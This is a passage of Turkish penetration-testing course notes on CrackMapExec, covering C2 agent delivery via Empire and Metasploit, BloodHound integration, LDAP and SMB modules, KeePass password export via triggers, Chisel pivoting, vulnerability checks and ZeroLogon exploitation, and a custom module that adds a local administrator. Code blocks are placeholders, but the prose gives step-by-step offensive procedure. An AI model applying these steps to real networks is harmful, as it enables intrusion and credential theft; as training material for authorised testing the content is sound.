Şimdi listener'ı ayarlamamız gerekiyor ve host'u IP adresimize ve Port'u da aracının bağlanacağı TCP 8001'e ayarlayacağız.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

Artık listener'ımız çalışıyor ve `empire_exec` modülü ile Empire'a bir `agent` almak için CrackMapExec'i kullanabiliriz. Ayarladığımız listener olan `LISTENER=http` seçeneğini eklememiz gerekiyor.


### CrackMapExec Modülünü Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu çalıştırdığımızda, PowerShell Empire'da yeni bir agent görmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

Aynı şeyi CrackMapExec modülü `web_delivery` kullanarak Metasploit Framework üzerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modülünü yapılandırmamız ve sağlanan URL'yi CrackMapExec modülümüze bir parametre olarak kullanmamız gerekir. Msfconsole'u başlatalım ve `web_delivery` handler'ını yapılandıralım


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapılandırıldıktan sonra web_delivery modülünü kullanabiliriz. `URL` ve `PAYLOAD` olmak üzere iki seçeneği destekler. URL seçeneğini Metasploit tarafından sağlanan URL ile ayarlamamız gerekir ve PAYLOAD seçeneği seçtiğimiz payload mimarisine karşılık gelir. Eğer `x64` kullanıyorsak, `x64` varsayılan değer olduğu için bu seçeneği atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. Eğer `32 bit` payload kullanıyorsak `PAYLOAD=32` seçeneğini ayarlamamız gerekir. Şimdi bunu çalışırken görelim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum görmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

Başka bir C2 Framework kullanmak istediğimizde, **Command Execution** bölümünde bahsedilen (SMB, WinRM, SSH) yöntemleri kullanarak aynı sonucu elde edebiliriz. Örneğin, bir **PowerShell** payload'u oluşturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip çalıştırmak için **-X** seçeneğiyle bir PowerShell komutu çalıştırabiliriz. Ayrıca, işlemi arka planda yürütmek için **`--no-output`** seçeneğini seçmemiz gerekecektir.

Örnek olarak Metasploit'i kullanalım ve modülü kullanmak yerine web_delivery payload'unda sağlanan PowerShell script'ini kopyalamayı deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bölüm, CrackMapExec'i C2 Frameworks gibi diğer bilgisayar korsanlığı araçlarıyla nasıl kullanabileceğimizi araştırıyor. Bir sonraki bölümde CrackMapExec'in BloodHound ile nasıl entegre edileceği incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldırganlar hem de savunmacılar tarafından alan güvenliğini analiz etmek için kullanılan açık kaynaklı bir araçtır. Araç, domain'den toplanan büyük miktarda veriyi alır. İlişkiyi görsel olarak temsil etmek ve geleneksel numaralandırma ile tespit edilmesi zor veya imkansız olan domain saldırı yollarını belirlemek için grafik teorisini kullanır. Bu bölümde Bloodhound'a aşina olduğunuzu varsayıyoruz. 


### **BloodHound**'da **Owned** olarak işaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geçirilmiş (owned) olarak işaretleyebiliriz. Bunu yapmak için node'a sağ tıklayıp **`Mark X as Owned`** seçeneğine tıklamamız yeterlidir. Bu, ele geçirdiğimiz kullanıcıları ve bilgisayarları takip etmek açısından faydalıdır, özellikle büyük bir organizasyonla çalışırken. Ayrıca, **`Shortest Path from Owned Principals`** (Ele Geçirilmiş Principal'dan En Kısa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele Geçirilmiş Principal'dan Domain Adminlerine En Kısa Yollar) gibi bir BloodHound cypher sorgusu gerçekleştirmek istediğimizde de kullanışlıdır.

CrackMapExec'i, ele geçirdiğimiz herhangi bir user veya computer'ı BloodHound veritabanında `owned` olarak işaretleyecek şekilde yapılandırabiliriz. Bunu yapmak için, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapılandırma dosyasını aşağıdaki seçeneklerle değiştirmemiz gerekir:

* Bloodhound yapılandırma seçeneği `bh_enabled`'ı `True` olarak ayarlayın.
* `bh_uri`'yi Bloodhound veritabanı `IP` adresimize ayarlayın.
* `bh_port`'u veritabanı `portuna` ayarlayın
* Kimlik bilgilerini bloodhound veritabanıyla eşleşecek şekilde ayarlayın: kullanıcı adı `neo4j` ve şifre `asdasd123` (Veritabanınıza karşılık geleni kullandığınızdan emin olun).

Yapılandırma aşağıdaki gibi görünmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: Bağlandığınız BloodHound veritabanına karşılık gelen kullanıcı adı ve parolayı kullandığınızdan emin olun.

### Bloodhound Verilerinin Toplanması

BloodHound verilerini toplamak için CrackMapExec kullanarak SharpHound'u çalıştıracak ve ardından dosyayı saldırı hostumuza aktaracağız.

### BloodHound verilerinin toplanması

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Şimdi BloodHound'u açmamız ve verileri içe aktarmamız gerekiyor.


### BloodHound'da Kullanıcıları Owned Olarak Ayarlama

Veriler içe aktarıldıktan sonra, `robert` kullanıcısı ile bağlanmaya çalışırsak, kullanıcıyı BloodHound veritabanında owned olunan olarak ayarlayacaktır.

### Kullanıcı BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanıcısı olan bir makineyi tehlikeye atarsak da aynı şey olacaktır. Bulunan tüm yeni kullanıcıları owned olarak ayarlayacaktır.

### Procdump Modülü ile Kullanıcıları Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: Tüm CrackMapExec seçenekleri BloodHound veritabanı ile senkronize olmayacaktır. Örneğin, `--ntds` veya `--lsa` seçeneklerini denersek, kullanıcıları veritabanında sahip olunan olarak işaretlemez, ancak `procdump` veya `lsassy` gibi modüller kullanıcıları sahip olunan olarak işaretler.


### BloodHound'da Bilgisayarları Owned Olarak Ayarlama

Yazım sırasında, BloodHound entegrasyonu yalnızca user'ları Owned olarak işaretlemektedir. Bir `computer` owned olarak işaretlemek istiyorsak, `bh_owned` modülünü ve `neo4j` veritabanımızın kullanıcı adı ve şifresini kullanabiliriz. Aşağıdaki örnekte, diğer varsayılan değerler neo4j veritabanımızla eşleştiği için yalnızca `PASS` seçeneğini ekleyeceğiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, büyük ağlarla uğraşırken birçok seçenek sunar ve müşterilerimizle paylaşmak istememiz durumunda veritabanını güncellemenin hızlı bir yoludur. Bir sonraki bölümde, CrackMapExec'te mevcut olan bazı popüler modüllerle çalışacağız.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici şeylerden biri, modüler olması ve herkesin modüller oluşturmasına ve bunları araca katkıda bulunmasına izin vermesidir. CrackMapExec, exploit ve exploit sonrası görevleri kolaylaştırmak için işlemler gerçekleştirmemizi sağlayan 50'den fazla modüle sahiptir. Bu bölümde LDAP ve SMB protokolleri için bu modüllerden bazıları incelenecektir.


### LDAP Protocol Modules

LDAP protokolü yaygın olarak Domain Controller'lar ile etkileşime geçmemizi ve onlardan bilgi almamızı sağlar. Active Directory'den ilginç bilgiler çıkarmamızı sağlayacak bazı modülleri gözden geçirelim.


### **LDAP Module - get-network**

`get-network` modülü [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'ı  temel alır. Varsayılan olarak, Active Directory'deki herhangi bir kullanıcı, `zone transferine` benzer şekilde Domain veya Forest DNS bölgelerindeki tüm DNS kayıtlarını numaralandırabilir. Bu araç, internal ağların yeniden yapılandırılması amacıyla bölgedeki tüm DNS kayıtlarının numaralandırılmasını ve dışa aktarılmasını sağlar.

Modülü kullanmanın üç (3) yolu vardır:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adları).

Varsayılan olarak, herhangi bir seçenek belirtmezsek, modül yalnızca IP adresini alacaktır. `ALL=true` seçeneğini seçersek, hem IP hem de domain adlarını alır ve `ONLY_HOSTS=true` olarak belirtirsek, yalnızca FQDN'yi alırız.


### DNS Sunucusundan (Record) Kayıtları Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazının yazıldığı zamanda, modül **`adidnsdump`** aracıyla bazı farklılıklar göstermektedir. Sonuçlar, hesaplar arasında farklılık gösterebilir.


### LDAP Module - laps

Bir başka harika modül de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e bağlı bilgisayarlarda local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL'ler tarafından korunur, böylece yalnızca belirli kullanıcılar bunları okuyabilir veya `parola sıfırlama` talebinde bulunabilir. Laps modülü ile bir hesabın okuma erişimine sahip olduğu tüm bilgisayarları alabiliriz. Bir bilgisayarı belirtmek için `COMPUTER` seçeneğini de kullanabilir veya benzer ada sahip birkaç bilgisayarı almak için bir wildcard karakterle birlikte kullanabiliriz.


### LAPS Modülü Parolaların Alınması

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: Kullanılan parola bir örnektir. Hedef hostta çalışmayacaktır

### LDAP Modülü - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'ü ile temsil edilen ve varsayılan olarak bir **user**'ın bir **domain** içinde oluşturabileceği **computer account** sayısını belirten bir **domain level attribute**'tür.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazı **attack** senaryolarında **domain** içinde bir **machine** oluşturmak gerekebilir, bu yüzden **account machine quota attribute**'ünü **enumerate** etmek önemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir başka harika modül ise bir veya birden fazla object'in `DACL`'lerini okumamızı ve dışa aktarmamızı sağlayan `daclread`'dir. Bu modül Active Directory erişimini numaralandırmamızı sağlayacaktır. Aşağıdaki seçeneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabının tüm **ACE**'lerini okumak istiyoruz. Bunun için **`TARGET`** seçeneğini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace Kullanıcısının DACL'sini Oku

{{CODE_BLOCK_203}}


Ayrıca belirli hakları da arayabiliriz, örneğin hangi **principal**'ların **DCSync** haklarına sahip olduğunu. Bunun için **`TARGET_DN`** seçeneğini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seçeneğini seçmemiz ve aramak istediğimiz hakları **`RIGHTS`** seçeneğiyle belirlememiz gerekir.

### DCSync Rights'a Sahip Kullanıcıları Arama

{{CODE_BLOCK_204}}



Çıktıda gösterildiği gibi, `ACE[4]` `robert` kullanıcısının hedef domain'de `DCSync` haklarına sahip olduğunu gösterir.

LDAP'ta birkaç modül daha kullanabiliriz. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolünde daha fazla modül mevcuttur. CrackMapExec modülünde yaptığımız şeylerin çoğu SMB protokolünü kullanır. İlginç bilgiler elde etmemizi sağlayacak bazı modülleri gözden geçirelim.

Not: SMB kullanan modüllerin çoğunun çalışması için admin haklarına ( `Pwned!` ) ihtiyaç vardır.


### SMB Modülleri - get_netconnections ve ioxidresolver

Bir ağ pentesti üzerinde çalışırken, sürekli olarak daha fazla kaynağa veya ağa erişim elde etmeye çalışırız. CrackMapExec, daha önce tehlikeye attığımız bir makineyi numaralandırmamıza ve birden fazla ağ yapılandırmasına sahip olup olmadığını belirlememize olanak tanıyan bazı modüllere sahiptir. `get_netconnections` ve `ioxidresolver` modüllerini kullanalım ve farklarını görelim.

`get_netconnections` modülü, ağ bağlantılarını sorgulamak için `WMI` kullanır. `IPv6` ve herhangi bir ikincil IP dahil olmak üzere tüm IP adreslerinin yanı sıra domain adını da alır.


### get_netconnections Module

{{CODE_BLOCK_206}}


Öte yandan, `ioxidresolver` modülü IP adreslerini sorgulamak için RPC kullanır. Ancak, bu modül `IPv6` adreslerini içermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: İhtiyaçlarımıza en uygun olanı seçebilmemiz için bir modülün nasıl çalıştığını anlamak önemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal ağlarda adminler ve kullanıcılar tarafından parolaları ve gizli bilgileri tek bir veritabanında saklamak için yaygın olarak kullanılan ücretsiz, açık kaynaklı bir password manager'dır. Bir master password onu korur. Bir KeePass veritabanı alırsak, onu açmak için şifresine ihtiyacımız vardır.

### KeePass'i Keşfetme

{{CODE_BLOCK_208}}

Eğer master parolaya sahip değilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafından geliştirilen ve veritabanını açık metin olarak dışa aktarmak için KeePass'ın triger sistemini kullanan bir teknik kullanmaktır. KeePass yapılandırma dosyasını, veritabanını otomatik olarak açık metin olarak dışa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) içerecek şekilde değiştirir.

Bunu kullanmak için beş (5) adıma ihtiyacımız var:

*  KeePass yapılandırma dosyasını bulun. Biz bunu `keepass_discover` modülü ile yaptık.
 * `ACTION=ADD` seçeneğini ve `KEEPASS_CONFIG_PATH` öğesini kullanarak trigger'ı yapılandırma dosyasına ekleyin.

### KeePass Yapılandırma Dosyasına Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapılandırma yolu için ters eğik çizgi (`/`) veya çift eğik çizgi (`\`) kullandığınızdan emin olun.

* Kullanıcının KeePass'i açmasını ve master parolayı girmesini bekleyin. Bu işlemi zorlamak için `ACTION=RESTART` seçeneğini kullanarak KeePass.exe prosesini yeniden başlatabiliriz. Hedef makinede oturum açmış çok sayıda kullanıcı varsa, `USER=julio` gibi kullanıcı adı ile `USER` seçeneğini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seçeneğini kullanarak export edilen veritabanını makinemize sorgulayın. Daha sonra şifre girişlerini aramak için grep kullanabiliriz.


### Ele Geçirilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seçeneğini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapılandırma dosyasını temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modülün her seçeneğini öğrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seçeneğin iyi yanı, **extract_password** yöntemini de içermesidir; bu yöntem **.xml** dosyasında herhangi bir parola girişini arar ve konsola yazdırır.


### keeppass_trigger TÜMÜNÜ Tek Komutta Çalıştırma

{{CODE_BLOCK_214}}

Not: Modül şifreyi yazdırırken sorun yaşayabilir. Bir hata alabiliriz, ancak şifre `/tmp/export.xml` dosyasında olacaktır, böylece manuel olarak alabiliriz.

### RDP'yi Etkinleştirme veya Devre Dışı Bırakma

Değerlendirme yaparken yapmak isteyebileceğimiz yaygın bir görev, RDP aracılığıyla bir hedef makineye bağlanmaktır. Bu, başka türlü lateral hareket saldırıları gerçekleştiremediğimiz veya standart bir protokol kullanarak radarın altından geçmek istediğimiz bazı senaryolarda yararlı olabilir.

Bağlanmak istediğimiz makinede RDP etkin değilse, buna izin vermek için RDP modülünü kullanabiliriz. `ACTION` seçeneğini ve ardından `enable` veya `disable` seçeneklerini belirtmemiz gerekir.


### RDP'yi Etkinleştirme

{{CODE_BLOCK_215}}


SMB'de birkaç modül daha vardır. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bölümde, ZeroLogon gibi bilinen güvenlik açıklarından yararlanan diğer SMB modüllerine bakacağız

### Vulnerability Scan Modules

Sızma testi yaparken gerçekleştirdiğimiz günlük faaliyetlerden biri güvenlik açıklarını tespit etmeye çalışmaktır. Eğer herhangi birini bulabilirsek, exploitation işi basit olabilir.

CrackMapExec, güvenlik açıklarını tespit etmemizi sağlayan bazı modüller içerir. Bu oturumda bunlardan bazılarını inceleyeceğiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geçirdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki ağ kartı var ve amacımız domainin saldırıya karşı savunmasız olup olmadığını belirlemek. Domainin IP adresi `172.16.10.3`'tür.

Domain'e erişim sağlamak için, CME ile ProxyChain bölümünde öğrendiklerimizi kullanacağız ve Chisel ile bir bağlantı kuracağız


### Chisel'i Hedef Makineye Gönderme

{{CODE_BLOCK_217}}


### Saldırı Hostumuzda Chisel'ı Sunucu Olarak Çalıştırma

{{CODE_BLOCK_218}}


### Chisel'ı Tehlikeye Düşmüş Cihazdan Saldırı Hostumuza Bağlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki güvenlik açığı modüllerinin çoğu yalnızca kontrol edilir ve bu modülleri güvenlik açıklarından yararlanmak için kullanamayız. [ZeroLogon güvenlik açığı](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile başlayalım.


### ZeroLogon

Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in controller'ı ele geçirmek için savunmasız bir Netlogon session'ı başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.

CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.


### ZeroLogon Güvenlik Açığı Kontrolü

{{CODE_BLOCK_220}}


### PetitPotam

Güvenlik araştırmacısı [Gilles Lionel](https://twitter.com/topotam77) kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu servisine (örneğin bir Domain Controller) yönelik klasik bir `NTLM relay` saldırısıdır. Lionel ayrıca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir proof of  concept kodu da yayınladı.

CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan `petitpotam` adlı bir modül içerir.


### Petitpotam Güvenlik Açığı Kontrolü

{{CODE_BLOCK_221}}


### noPAC

noPAC güvenlik açığının exploit'i, normal bir domain kullanıcısının ayrıcalıklarının bir domain admin yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.

CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin controller'ı ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.

Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü `dfscoerce`'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için `Y3t4n0th3rP4ssw0rd` şifresiyle `carole.holmes` hesabını kullanacağız.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.

CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( `logging.debug` ) ile bazı debug log'ları eklediğini göreceğiz. CrackMapExec'i hata debug modunda çalıştırırsak, bu logları yazdıracaktır.

CrackMapExec'i debug modunda çalıştırmak için protokolden önce `--verbose` seçeneğini kullanabiliriz


### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma

{{CODE_BLOCK_225}}


`DEBUG` ile başlayan satırlar `logging.debug`'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB servisindeki kritik bir kimliği doğrulanmamış remote kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### Güvenlik Açığından Yararlanma

Birçok güvenlik açığı gördük. Onlardan birini exploit etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.

---

### Kendi CME Modülümüzü Oluşturmak

Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.


### CrackMapExec'i Poetry ile derleyin

Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın

Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un Kurulması ve Çalıştırılması

{{CODE_BLOCK_229}}

Daha sonra açmak için `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni Modülümüzü Oluşturun

Modülümüzü oluşturalım. Yeni bir administrator hesabı oluşturacak basit bir script oluşturacağız.

* ./CrackMapExec/cme/modules klasörü altında `createadmin.py` adında bir dosya oluşturun.
* Aşağıdaki kod örneğini dosyaya kopyalayın:

{{CODE_BLOCK_231}}



* Şimdi modülümüzü özelleştirelim.

Bazı değişkenleri tanımlamamız gerekiyor:

* `name`, modül adını nasıl çağıracağımızı belirtir. Bu durumda, `createadmin` dosya adını kullanacağız.
* `description` modülün amacı için kısa bir açıklamadır. Biz bunu `Create a new administrator account` ayarlayacağız.
* `supported_protocols`, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece `SMB` kullanacağız.
* `opsec_safe`, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir `True` veya `False` değeridir.
* `multiple_hosts`, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.

Ayrıca, modül için değişkenleri tanımlamak için kullanılan `options()` methoduna da sahip olacağız. Bu durumda, `USER` ve `PASS` olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri `asdasd123` . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak `context.log.info` ve `context.log.highlight` metotlarını kullanacağız (farklı renklere sahipler).

Bu execute için, yöntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için `net user username password /add /Y` değeriyle ve kullanıcıyı administrators grubuna eklemek için `net localgroup administrators username /add` değeriyle command değişkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modülümüz şu şekilde görünmelidir:

{{CODE_BLOCK_234}}


### Modülümüzü Çalıştırma

Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.


### CME Modülümüzün Çalıştırılması createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.

{{CODE_BLOCK_236}}


İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.

Ayrıca `context.log.highlight(p)`'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?

### Diğer Yazarlardan Öğrenmek

Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.

Örneğin, `procdump.py` modülü `procdump.exe` çalıştırılabilir dosyasını bir `Base64` string olarak kaydeder, ardından Base64 stringini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için `tasklist` komutunu çalıştırır, bunu bir değişkene kaydeder ve process kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.

Başka bir örnek `get_description.py` . Bu modülü `groupmembership` modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve `memberOf` attribute'unu almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir pull request gönderdik. Pull request kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.

Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.


### Pull Request Oluşturma

CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir pull request'i ekleyerek projeye katkıda bulunabiliriz.

Bir pull request'i yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.

İlerleyen bölümlerde, CrackMapExec kullanımı için `IPv6`, `Kerberos Kimlik Doğrulama` ve `CrackMapExec` veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.


### Ek CME İşlevselliği

CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:

* Audit mode
* IPv6 desteği
* Birden fazla cihaza saldırırken tamamlanma yüzdesi

### Audit Mode

5.3.0 sürümünde yeni bir mod eklendi: `audit modu`. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz `emoji` ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.

Audit modunu yapılandırmak için, varsayılan olarak `~/.cme/cme.conf` adresinde bulunan yapılandırma dosyasını düzenlememiz ve `audit_mode` parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için `#` karakterini kullanacağız


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Şimdi çalıştırabilir ve parolanın çıktıda `########` ile değiştirildiğini görebiliriz.

{{CODE_BLOCK_238}}

